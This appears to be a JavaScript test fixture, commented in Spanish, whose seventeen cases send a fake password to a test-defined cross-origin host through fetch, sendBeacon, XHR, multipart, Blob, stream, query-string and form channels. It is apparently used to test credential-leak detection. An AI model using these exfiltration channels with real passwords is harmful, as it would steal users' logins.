// Cada caso envía la contraseña ficticia de una forma distinta.
const CLAVE = 'Prueba#2026';
const OTRO_SITIO = window.OTRO_SITIO; // lo define la prueba

window.casos = {
  async fetchJson() {
    await fetch(OTRO_SITIO + '/recibir/fetch-json', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ clave: btoa(CLAVE) }),
    });
  },
  sendBeaconTexto() {
    navigator.sendBeacon(OTRO_SITIO + '/recibir/beacon', 'c=' + btoa(CLAVE));
  },
  async xhrTexto() {
    await new Promise((resolve) => {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', OTRO_SITIO + '/recibir/xhr');
      xhr.onloadend = resolve;
      xhr.send('clave=' + encodeURIComponent(CLAVE));
    });
  },
  async fetchMultipart() {
    const fd = new FormData();
    fd.append('clave', CLAVE);
    await fetch(OTRO_SITIO + '/recibir/multipart', { method: 'POST', body: fd });
  },
  async fetchBlob() {
    await fetch(OTRO_SITIO + '/recibir/blob', {
      method: 'POST',
      body: new Blob([CLAVE], { type: 'application/octet-stream' }),
    });
  },
  async fetchKeepalive() {
    await fetch(OTRO_SITIO + '/recibir/keepalive', {
      method: 'POST',
      keepalive: true,
      body: 'k=' + CLAVE,
    });
  },
  async fetchBlobTexto() {
    await fetch(OTRO_SITIO + '/recibir/blob-texto', {
      method: 'POST',
      body: new Blob([CLAVE], { type: 'text/plain' }),
    });
  },
  async fetchArrayBuffer() {
    await fetch(OTRO_SITIO + '/recibir/arraybuffer', {
      method: 'POST',
      body: new TextEncoder().encode(CLAVE).buffer,
    });
  },
  async fetchUint8Array() {
    await fetch(OTRO_SITIO + '/recibir/uint8array', {
      method: 'POST',
      body: new TextEncoder().encode(CLAVE),
    });
  },
  async fetchUrlSearchParams() {
    await fetch(OTRO_SITIO + '/recibir/urlsearchparams', {
      method: 'POST',
      body: new URLSearchParams({ clave: CLAVE }),
    });
  },
  async fetchFile() {
    await fetch(OTRO_SITIO + '/recibir/file', {
      method: 'POST',
      body: new File([CLAVE], 'datos.txt', { type: 'text/plain' }),
    });
  },
  beaconBlob() {
    navigator.sendBeacon(
      OTRO_SITIO + '/recibir/beacon-blob',
      new Blob([CLAVE], { type: 'text/plain' }),
    );
  },
  async xhrBlob() {
    await new Promise((resolve) => {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', OTRO_SITIO + '/recibir/xhr-blob');
      xhr.onloadend = resolve;
      xhr.send(new Blob([CLAVE]));
    });
  },
  async fetchStream() {
    const stream = new ReadableStream({
      start(c) {
        c.enqueue(new TextEncoder().encode(CLAVE));
        c.close();
      },
    });
    try {
      await fetch(OTRO_SITIO + '/recibir/stream', { method: 'POST', body: stream, duplex: 'half' });
    } catch (e) {
      /* HTTP/1.1 puede rechazar el streaming de subida */
    }
  },
  async multipartConArchivo() {
    const fd = new FormData();
    fd.append('archivo', new Blob([CLAVE], { type: 'text/plain' }), 'x.txt');
    await fetch(OTRO_SITIO + '/recibir/multipart-archivo', { method: 'POST', body: fd });
  },
  async urlConsulta() {
    await fetch(OTRO_SITIO + '/recibir/url-consulta?c=' + encodeURIComponent(CLAVE), {
      method: 'POST',
    });
  },
  enviarFormulario() {
    document.getElementById('login').submit();
  },
};
